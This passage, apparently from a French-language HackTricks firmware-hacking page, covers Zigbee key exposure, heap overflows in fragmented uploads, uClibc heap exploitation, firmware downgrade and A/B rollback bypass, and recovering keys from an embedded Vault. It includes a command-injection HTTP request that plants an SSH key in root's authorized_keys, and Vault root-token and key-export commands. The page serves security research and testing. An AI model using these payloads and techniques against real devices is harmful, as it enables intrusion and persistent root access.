- Les gestionnaires accessibles uniquement pendant l’**association**, la découverte ou les phases de téléchargement du firmware/modèle

Pour Zigbee en particulier, capturez le trafic d’association et vérifiez si la cible utilise encore la **Link Key** par défaut `ZigBeeAlliance09`. Si c’est le cas, l’interception du trafic d’association peut révéler la **Network Key**. Les codes d’installation de Zigbee 3.0 réduisent cette exposition ; vérifiez donc si l’appareil testé les impose réellement.

### Gestionnaires de protocoles spécifiques au fabricant et accessibilité conditionnée par une FSM

Les commandes Zigbee/ZCL spécifiques au fabricant constituent souvent une meilleure cible que les clusters normalisés, car elles alimentent du **code d’analyse personnalisé** et des **FSM** internes dont la validation a été moins éprouvée.<sup>[[8]](#references)</sup>

Méthode pratique :

- Faites le reverse engineering du dispatcher de commandes jusqu’à trouver le **gestionnaire réservé au fabricant**.
- Retrouvez les tables d’**état**, d’**événement**, de **vérification**, d’**action** et d’**état suivant** de la FSM.
- Repérez les **états transitoires** qui avancent automatiquement, ainsi que les branches de nouvelle tentative/erreur qui finissent par réinitialiser ou libérer l’état contrôlé par l’attaquant.
- Confirmez les échanges légitimes requis par le protocole pour placer le daemon dans l’état vulnérable, au lieu de supposer que le gestionnaire bogué est toujours accessible.

Pour les protocoles sensibles au timing, la relecture de paquets depuis un framework Python peut être trop lente. Une méthode plus fiable consiste à émuler un appareil légitime sur du matériel réel (par exemple un **nRF52840**) avec une pile de qualité industrielle afin d’exposer les **endpoints**, **attributs** et délais d’association appropriés.

### Classe de bugs liée aux téléchargements fragmentés dans les daemons embarqués

Une classe de bugs récurrente dans les firmwares concerne les téléchargements **fragmentés de blobs/modèles/configurations** :<sup>[[8]](#references)</sup>

1. Le **premier fragment** (`offset == 0`) stocke `ctx->total_size` et alloue `malloc(total_size)`.
2. Les fragments suivants ne valident que les champs **propres au paquet** contrôlés par l’attaquant, tels que `packet_total_size >= offset + chunk_len`.
3. La copie utilise `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sans vérifier que la taille ne dépasse pas la **taille initialement allouée**.

Cela permet à un attaquant d’envoyer :

- Un premier fragment valide déclarant une taille totale **faible** afin de forcer une petite allocation sur le tas.
- Un fragment ultérieur avec l’**offset attendu**, mais un `chunk_len` plus grand.
- Une taille propre au paquet falsifiée qui satisfait les vérifications récentes tout en provoquant un dépassement du buffer initialement alloué.

Lorsque le chemin vulnérable dépend de la logique d’association, l’exploitation doit inclure suffisamment d’**émulation d’appareil** pour amener la cible dans l’état attendu de téléchargement de modèle ou de blob avant d’envoyer les fragments malformés.

### Déclencheurs de `free()` pilotés par le protocole

Dans les daemons embarqués, le moyen le plus simple de déclencher une exploitation des métadonnées du tas n’est souvent pas « d’attendre le nettoyage », mais de **forcer la gestion des erreurs du protocole** :<sup>[[8]](#references)</sup>

- Envoyez des fragments ultérieurs malformés pour pousser la FSM dans des états de **nouvelle tentative** ou d’**erreur**.
- Dépassez le seuil de tentatives afin que le daemon **réinitialise le contexte** et libère le buffer corrompu.
- Utilisez ce `free()` prévisible pour déclencher des primitives côté allocateur avant que le processus ne plante pour d’autres raisons.

Cette méthode est particulièrement utile contre les allocateurs **musl/uClibc/dlmalloc-like** sous Linux embarqué, où la corruption des métadonnées de chunk peut transformer la logique unlink/unbin en primitive d’écriture. Une technique stable consiste à corrompre un **champ de taille** pour rediriger le parcours de l’allocateur vers des **fake chunks placés dans le buffer débordé**, plutôt que d’écraser directement les pointeurs de bin réels et de faire planter le processus.

## Exploitation binaire et preuve de concept

Le développement d’un PoC pour les vulnérabilités identifiées exige une compréhension approfondie de l’architecture cible et une programmation dans des langages de bas niveau. Les protections d’exécution binaires sont rares dans les systèmes embarqués, mais lorsqu’elles sont présentes, des techniques comme le Return Oriented Programming (ROP) peuvent être nécessaires.

### Notes sur l’exploitation des fastbins uClibc (Linux embarqué)

- **Fastbins + consolidation :** uClibc utilise des fastbins similaires à ceux de glibc. Une allocation volumineuse ultérieure peut déclencher `__malloc_consolidate()` ; tout fake chunk doit donc résister aux vérifications (taille cohérente, `fd = 0` et chunks voisins considérés comme « utilisés »).<sup>[[6]](#references)</sup>
- **Binaires non-PIE sous ASLR :** si ASLR est activé, mais que le binaire principal est **non-PIE**, les adresses `.data/.bss` du binaire restent stables. Vous pouvez cibler une zone qui ressemble déjà à un en-tête de chunk valide du tas afin de faire aboutir une allocation fastbin sur une **table de pointeurs de fonction**.
- **NUL qui arrête l’analyseur :** lors de l’analyse du JSON, un `\x00` dans le payload peut arrêter l’analyse tout en conservant les octets contrôlés par l’attaquant qui suivent pour un stack pivot/une chaîne ROP.
- **Shellcode via `/proc/self/mem` :** une chaîne ROP qui appelle `open("/proc/self/mem")`, `lseek()` et `write()` peut déposer du shellcode exécutable dans une zone mémoire connue et y sauter.

## Systèmes d’exploitation préparés pour l’analyse de firmware

Des systèmes d’exploitation comme [AttifyOS](https://github.com/adi0x90/attifyos) et [EmbedOS](https://github.com/scriptingxss/EmbedOS) fournissent des environnements préconfigurés pour tester la sécurité des firmwares, équipés des outils nécessaires.

## OS préparés pour analyser les firmwares

- [**AttifyOS**](https://github.com/adi0x90/attifyos) : AttifyOS est une distribution destinée à vous aider à évaluer la sécurité et à effectuer des tests d’intrusion sur les appareils de l’Internet des objets (IoT). Elle vous fait gagner beaucoup de temps en fournissant un environnement préconfiguré avec tous les outils nécessaires.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS) : système d’exploitation de test de sécurité embarquée basé sur Ubuntu 18.04, préchargé avec des outils de test de sécurité des firmwares.

## Attaques par downgrade de firmware et mécanismes de mise à jour non sécurisés

Même lorsqu’un fabricant implémente la vérification des signatures cryptographiques des images de firmware, la **protection contre le retour à une version antérieure (downgrade)** est souvent omise. Lorsque le chargeur de démarrage ou de récupération vérifie uniquement la signature à l’aide d’une clé publique intégrée, sans comparer la *version* (ou un compteur monotone) de l’image installée, un attaquant peut installer légitimement un **ancien firmware vulnérable toujours doté d’une signature valide**, réintroduisant ainsi des vulnérabilités corrigées.<sup>[[4]](#references)</sup>

Méthode d’attaque habituelle :

1. **Obtenir une ancienne image signée**
   * La récupérer depuis le portail de téléchargement public, le CDN ou le site d’assistance du fabricant.
   * L’extraire des applications mobiles/de bureau associées (par exemple dans `assets/firmware/` d’un APK Android).
   * La récupérer dans des dépôts tiers comme VirusTotal, des archives Internet, des forums, etc.
2. **Téléverser ou fournir l’image à l’appareil** via un canal de mise à jour exposé :
   * Interface web, API d’application mobile, USB, TFTP, MQTT, etc.
   * De nombreux appareils IoT grand public exposent des endpoints HTTP(S) *non authentifiés* qui acceptent des blobs de firmware encodés en Base64, les décodent côté serveur et déclenchent la récupération/la mise à jour.
3. Après le downgrade, exploiter une vulnérabilité corrigée dans une version plus récente (par exemple un filtre contre l’injection de commandes ajouté ultérieurement).
4. Facultativement, réinstaller la dernière image ou désactiver les mises à jour pour éviter d’être détecté une fois la persistance obtenue.

### Exemple : injection de commandes après un downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Dans le firmware vulnérable (rétrogradé), le paramètre `md5` est concaténé directement à une commande shell sans assainissement, ce qui permet d’injecter des commandes arbitraires (ici, pour activer l’accès root par clé SSH). Les versions ultérieures du firmware ont introduit un filtre de caractères basique, mais l’absence de protection contre la rétrogradation rend cette correction inutile.<sup>[[4]](#references)</sup>

### Extraction du firmware depuis des applications mobiles

De nombreux fournisseurs incluent des images complètes du firmware dans leurs applications mobiles associées afin que l’application puisse mettre à jour l’appareil via Bluetooth/Wi-Fi. Ces paquets sont généralement stockés sans chiffrement dans l’APK/APEX, sous des chemins tels que `assets/fw/` ou `res/raw/`. Des outils comme `apktool`, `ghidra`, ou même le simple outil `unzip` permettent d’extraire des images signées sans toucher au matériel physique.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Contournement de l’anti-rollback limité à l’updater dans les conceptions à slots A/B

Certains fournisseurs implémentent bien un **ratchet** anti-downgrade, mais uniquement dans la logique de l’*updater* (par exemple une routine UDS sur CAN, une commande de récupération ou un agent OTA en espace utilisateur). Si le **bootloader** vérifie ensuite uniquement la signature/le CRC de l’image et fait confiance à la table de partitions ou aux métadonnées des slots, la protection contre le rollback peut toujours être contournée.<sup>[[7]](#references)</sup>

Conception généralement faible :

- Les métadonnées du firmware contiennent à la fois un descripteur de version et un **ratchet de sécurité** / compteur monotone.
- L’updater compare le ratchet de l’image à une valeur stockée dans le stockage persistant et rejette les images signées plus anciennes.
- Le **bootloader** n’analyse pas ce ratchet et vérifie uniquement l’en-tête, le CRC et la signature avant de démarrer le slot sélectionné.
- L’activation du slot est stockée séparément dans une table de partitions ou dans un compteur de génération par slot, et n’est **pas liée cryptographiquement** au digest exact du firmware validé.

Cela crée une primitive **valider une image / en démarrer une autre** dans les systèmes à double slot. Si l’attaquant peut faire en sorte que l’updater désigne le slot B comme prochaine cible de démarrage au moyen d’une image signée actuelle, puis écraser le slot B avant le redémarrage, le bootloader peut quand même démarrer l’image rétrogradée, car il ne fait confiance qu’aux métadonnées de slot déjà validées.

Schéma d’abus courant :

1. Téléverser un firmware **actuel et signé** dans le slot passif, puis exécuter la routine normale de validation/basculement pour que la configuration désigne ce slot comme prochain slot actif.
2. **Ne pas redémarrer tout de suite**. Relancer la routine de préparation/effacement du slot au cours de la même session.
3. Exploiter un état de démarrage obsolète ou une logique de sélection de slot obsolète, afin que l’updater efface le **même slot physique** qui vient d’être promu.
4. Écrire un firmware **plus ancien, mais toujours signé** dans ce slot.
5. Ignorer la routine de validation qui applique le ratchet et redémarrer directement.
6. Le bootloader sélectionne le slot promu, vérifie uniquement la signature/l’intégrité et démarre l’ancienne image.

Points à vérifier lors de la rétro-ingénierie des implémentations de mise à jour A/B :

- Sélection du slot dérivée de **drapeaux de démarrage** qui ne sont pas actualisés après un basculement réussi.
- Routine de type `prepare_passive_slot()` qui efface un slot en fonction d’un état obsolète plutôt que de la **configuration actuellement validée**.
- Fonction de type `part_write_layout()` qui incrémente uniquement un **compteur de génération** / un drapeau d’activité et ne stocke pas le hash de l’image validée.
- Vérifications du ratchet implémentées en espace utilisateur ou dans le code de l’updater, mais **pas** dans la ROM / le bootloader / les étapes de secure boot.
- Routines d’effacement ou de récupération qui laissent le slot marqué comme amorçable, même après que son contenu a été supprimé puis réécrit.

### Liste de vérification pour évaluer la logique de mise à jour

* Le transport/l’authentification du *point de terminaison de mise à jour* est-il suffisamment protégé (TLS + authentification) ?
* L’appareil compare-t-il les **numéros de version** ou un **compteur monotone anti-rollback** avant le flashage ?
* L’image est-elle vérifiée dans une chaîne de secure boot (par exemple, les signatures sont-elles vérifiées par le code ROM) ?
* Le **bootloader applique-t-il le même ratchet** que l’updater, au lieu de vérifier uniquement la signature/le CRC ?
* Les métadonnées d’activation du slot sont-elles **liées au digest/à la version du firmware validé**, ou le slot peut-il être modifié après sa promotion ?
* Après le succès d’un basculement de slot, l’appareil est-il forcé de redémarrer, ou les routines ultérieures de mise à jour/d’effacement restent-elles accessibles au cours de la même session ?
* Le code en espace utilisateur effectue-t-il des vérifications supplémentaires (par exemple, sur la carte des partitions autorisée ou le numéro de modèle) ?
* Les flux de mise à jour *partielle* ou de *sauvegarde* réutilisent-ils la même logique de validation ?

> 💡 Si l’un des éléments ci-dessus manque, la plateforme est probablement vulnérable aux attaques par rollback.

## Firmwares vulnérables pour s’entraîner

Pour vous entraîner à découvrir des vulnérabilités dans les firmwares, utilisez les projets de firmware vulnérables suivants comme point de départ.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Récupération des clés de déchiffrement du firmware à partir de l’état KMS/Vault embarqué

Lorsqu’une image de mise à jour combine de petites métadonnées en texte clair avec un blob volumineux à forte entropie, analysez d’abord le conteneur avant toute tentative de brute force :<sup>[[1]](#references)</sup>

- Extrayez les en-têtes, les décalages et les limites de lignes avec `hexdump`, `xxd`, `strings -tx`, `base64 -d` et `binwalk -E`.
- `Salted__` indique généralement le format OpenSSL `enc` : les 8 octets suivants correspondent au sel et les octets restants au texte chiffré.
- Un champ Base64 qui, une fois décodé, fait exactement `256` octets indique fortement qu’il s’agit d’un texte chiffré RSA-2048 qui enveloppe un mot de passe de firmware / une clé de session aléatoire.
- Les éléments PGP détachés présents dans le même fichier ne protègent souvent que l’authenticité ; ne partez pas du principe qu’ils assurent la confidentialité.

Si la recherche de clés statiques (`grep`, `strings`, recherches PEM/PGP) échoue, rétro-ingénieriez plutôt le **chemin de déchiffrement opérationnel** au lieu de chercher uniquement des clés privées :

- Décompilez le binaire de l’updater / de gestion et tracez qui lit le blob chiffré, quel utilitaire/API le déchiffre et quel nom de clé logique il demande.
- Recherchez l’état KMS dans le système de fichiers racine extrait (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), ainsi que les fichiers d’unités et les scripts d’initialisation.
- Considérez les commandes `vault operator unseal ...` en texte clair, les clés de récupération, les jetons d’amorçage ou les scripts locaux d’auto-déverrouillage KMS comme équivalents à du matériel de clé privée.

Si l’appliance inclut le binaire Vault d’origine et son backend de stockage, reproduire cet environnement est généralement plus facile que de réimplémenter les composants internes de Vault :

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Avec root sur le KMS cloné :

- Rendre les clés transit exportables uniquement dans le clone isolé : `vault write transit/keys/<name>/config exportable=true`
- Exporter la clé de déchiffrement : `vault read transit/export/encryption-key/<name>`
- Tester la clé RSA récupérée avec la paire exacte de padding/hash utilisée par le KMS. Un échec du déchiffrement PKCS#1 v1.5 et un échec du déchiffrement OAEP par défaut ne prouvent **pas** que la clé est incorrecte ; de nombreux flux basés sur Vault utilisent OAEP avec SHA-256, alors que les bibliothèques courantes utilisent SHA-1 par défaut.
- Si la charge utile commence par `Salted__`, reproduire exactement le KDF OpenSSL du fournisseur (`EVP_BytesToKey`, souvent MD5 sur les appareils anciens) avant de tenter le déchiffrement AES-CBC.

Le « firmware chiffré » devient ainsi un problème plus général : **récupérer les clés opérationnelles côté appareil, puis reproduire hors ligne les paramètres exacts de déchiffrement et de KDF**.

## Formations et certifications

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Craquer un firmware avec Claude : compétences de niveau senior, autonomie de niveau junior](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Méthodologie de tests de sécurité du firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Pratique du hacking IoT : le guide définitif pour attaquer l’Internet des objets](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Exploitation de zero-days dans du matériel abandonné – blog Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Comment un appareil connecté à 20 $ m’a donné accès à votre domicile](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Maintenant, vous voyez mi : maintenant, vous êtes pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Exploitation du Tesla Wall Connector depuis son connecteur de port de charge - Partie 2 : contournement de l’anti-rétrogradation](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Faites-le clignoter : exploitation Over-the-Air du Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS sur QEMU, partie 1 : décompression](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Documentation du noyau Linux - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS sur QEMU, partie 2 : débogage et correction](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Mots de passe du BIOS Dell : le chiffrement XOR faible permet leur récupération depuis la mémoire flash SPI (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Outils de récupération des mots de passe du BIOS Dell](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
